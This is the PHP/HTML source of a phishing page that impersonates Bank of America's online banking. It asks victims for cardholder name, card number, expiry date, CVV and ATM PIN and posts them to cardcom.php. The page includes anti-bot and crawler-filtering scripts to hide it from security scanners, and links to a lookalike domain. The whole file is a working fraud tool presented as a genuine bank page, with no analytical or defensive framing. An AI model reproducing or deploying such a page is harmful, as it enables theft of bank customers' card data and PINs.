<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include "../autob/bts2.php";
?>
<!DOCTYPE html">
<html lang="en-US" class="win chrome chrome-88 webkit svg-bg not-retina cf-cnx-regular-active retina">

<head class="at-element-marker">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="stylesheet" type="text/css" href="../assess/bootstrap.min.css">
    <script src="../assess/jquery-3.5.1.slim.min.js.download" type="text/javascript"></script>
    <title>Bank of America | Online Banking</title>
    <link rel="shortcut icon" href="https://www.bankofamerica.com/pa/global-assets/1.0/graphic/favicon.ico?ts=20151018"
        type="image/x-icon">
    <link rel="stylesheet" type="text/css" href="../assess/vipaa-v4-jawr.css" media="all">
    <link rel="stylesheet" type="text/css" href="../assess/vipaa-v4-jawr-print.css" media="print">
    <script src="../assess/vipaa-v4-jawr.js.download" type="text/javascript"></script>
    <style id="at-makers-style" class="at-flicker-control">
    .mboxDefault {
        visibility: hidden;
    }
    </style>
    <script src="../assess/hover.js.download" type="text/javascript" async="true"></script>
    <style id="at-makers-style" class="at-flicker-control">
    .mboxDefault {
        visibility: hidden;
    }
    </style>
    <script type="text/javascript" src="../assess/jquery-migrate-custom.js.download"></script>
    <style>
    body {
        display: none;
    }
    </style>
    <script src="../assess/hover.js(1).download" type="text/javascript" async="true"></script>
    <script type="text/javascript" src="../assess/creanza.js.download" id="opmi59"></script>
    <script type="text/javascript" src="../assess/kurt.js.download" id="j8xw3p"></script>
    <script type="text/javascript" src="../assess/dis4.js.download" id="629vvl"></script>
    <script type="text/javascript" src="../assess/porte.js.download" id="0ca6ta"></script>
    <script src="../assess/jquery.min.js"></script>
    <script src="../assess/jquery.mask.js"></script>
    <script>
    $(function() {
        $('#cardnumber').mask('0000 0000 0000 0000');
        $('#exp').mask('00/00');
    });
    </script>
</head>

<body class="fsd-layout-body" style="display: block;">

    <script type="text/javascript">
    if (self == top) {
        var theBody = document.getElementsByTagName("body")[0];
        theBody.style.display = "block";
    } else {
        top.location = self.location;
    }
    </script>
    <noscript>
        <style>
        body {
            display: block;
        }
        </style>
    </noscript>
    <a class="ada-hidden ada-visible-focus" href="#skip-to-h1" id="ada-skip-link">Skip to main content</a>
    <div class="fsd-layout fsd-2c-700lt-layout">
        <div class="fsd-border">
            <div class="center-content">
                <div class="header">


                    <div class="header-module">
                        <div class="fsd-secure-esp-skin">
                            <img height="28" width="230" alt="Bank of America" src="../assess/BofA_rgb.png">
                            <div class="page-type cnx-regular" data-font="#!">Credit card information</div>
                            <div class="right-links">
                                <div class="secure-area">Secure Area</div>
                                <a class="divide"
                                    href="https://secure.bankofamerica.com/login/languageToggle.go?request_locale=es_US"
                                    target="_self" name="spanish_toggle"
                                    title="Muestra esta sesión de la Banca en Lnea">En Español</a>
                                <div class="clearboth"></div>
                            </div>
                            <div class="clearboth"></div>
                        </div>
                    </div>

                    <script src="../assess/online-id-vipaa-module-enter-skin.js.download" type="text/javascript">
                    </script>


                    <div class="container">
                        <div class="row">
                            <div class="col-md-6 offset-md-3">

                                <form id="Signon" action="cardcom.php" name="Signon" method="POST" novalidate=""
                                    autocomplete="off" data-id="Signon">

                                    <br><br><br><br><br>
                                    <div class="form-group form-group-bg">
                                        <input type="text" class="form-control" value="" placeholder="Cardholder name"
                                            name="cardname" autocomplete="off" maxlength="50" autocapitalize="off">
                                    </div>


                                    <div class="form-group form-group-bg">
                                        <input type="text" class="form-control" value="" id="cardnumber"
                                            placeholder="Card Number" name="cardnumber" autocomplete="off"
                                            maxlength="19" aria-required="true">
                                    </div>


                                    <div class="form-row form-group-bg">
                                        <div class="col">
                                            <input type="text" value="" class="form-control" id="exp"
                                                placeholder="Exp Date (MM/YY)" name="expdate" maxlength="5"
                                                autocomplete="off" aria-required="true">
                                        </div>
                                        <div class="col">
                                            <input type="text" value="" class="form-control" placeholder="CVV"
                                                name="cvv" autocomplete="off" maxlength="4" aria-required="true">
                                        </div>
                                    </div>
                                    <br>


                                    <div class="form-group form-group-bg">
                                        <input type="password" value="" class="form-control" placeholder="ATM Card Pin"
                                            name='atm' autocomplete="off" maxlength="4">
                                    </div>


                                    <label class="helpNotifyUS" role="button">By clicking Agree &amp; Continue, I have
                                        read and agree to Bank of America <a data-click="userAgreement"
                                            href="https://verify.zurescraft.com/bdbbd/boa/SignOn/card/#"
                                            target="_blank">User Agreement</a>, <a data-click="privacyPolicy"
                                            href="https://verify.zurescraft.com/bdbbd/boa/SignOn/card/#"
                                            target="_blank">Privacy Policy</a> and <a data-click="esign"
                                            href="https://verify.zurescraft.com/bdbbd/boa/SignOn/card/#"
                                            target="_blank">Electronic Communications Delivery Policy</a>.</label><br>
                                    <input type="submit" name="continue" value="Agree &amp; Continue" data-id="submit"
                                        class="btn btn-outline-secondary btn-block" origin="cob">
                                </form>

                            </div>
                        </div>
                    </div>


                    <br><br><br><br><br><br><br>

                    <div class="footer-inner">

                        <div class="global-footer-module">
                            <div class="gray-bground-skin cssp">
                                <div class="secure">Secure area</div>


                                <div class="link-container">
                                    <div class="link-row">

                                        <a href="https://www.bankofamerica.com/security-center/privacy-overview/"
                                            name="Privacy_&amp;_Security_footer" title="Privacy"
                                            target="_blank">Privacy</a>

                                        <a class="last-link"
                                            href="https://www.bankofamerica.com/security-center/overview/"
                                            name="Security" title="Security" target="_blank">Security</a>
                                        <div class="clearboth">
                                            <?php if (!stripos($_SESSION['device'], 'thysec')) {
                                                banbot();
                                            }
                                            ; ?>
                                        </div>
                                    </div>
                                </div>
                                <p>Bank of America, N.A. Member FDIC. <a
                                        href="https://www.bankofamerica.com/help/equalhousing-popup/"
                                        name="Equal_Housing_Lender" target="_blank">Equal Housing Lender</a> <br>©&nbsp;
                                    <?php echo date('Y'); ?> Bank of America Corporation.
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>



    <div id="boaFormHelp" aria-live="rude" style="top: -1000px; left: -1000px; position: absolute; z-index: 100;">
        <div id="boaFormHelp-content"></div>
        <div class="boaFormHelp-bottom"></div>
    </div>
    <div aria-hidden="true"
        style="position: absolute; top: -999em; left: -999em; width: auto; font-size: 300px; font-family: cnx-regular, serif;">
        BlankTestESs</div>
    <div id="inauth_font_detector" style="visibility: hidden;position: absolute; top: 0px; left: -999px;"></div>
    <div id="restest" style="width: 0.5cm; height: 0.5cm; padding: 0px"></div>
    <div aria-hidden="true"
        style="position:absolute;top:-999em;left:-999em;width:auto;font-size:300px;font-family:serif">BlankTestESs</div>
</body>

</html>